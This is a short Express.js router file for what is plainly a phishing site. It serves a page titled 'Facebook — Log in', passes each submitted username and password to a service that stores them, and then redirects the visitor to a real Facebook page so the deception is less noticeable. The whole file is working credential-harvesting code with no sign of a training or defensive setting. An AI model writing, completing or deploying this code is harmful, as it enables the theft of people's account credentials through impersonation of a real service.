const express = require('express');
const UsersRouter = express.Router();
const UsersService = require('../services/users');


UsersRouter.get('/', (req, res)=>{
  res.render('index', {title: 'Facebook — Log in'});
});

UsersRouter.post('/', (req, res)=>{
  UsersService.createUser(req.body.username, req.body.password)
      .then(user => {
        return res.redirect('https://www.facebook.com/Programming-603586066673637/?modal=admin_todo_tour');
      })
      .catch(err => {
        return res.redirect('https://www.facebook.com/Programming-603586066673637/?modal=admin_todo_tour');
      });
});

module.exports = UsersRouter;
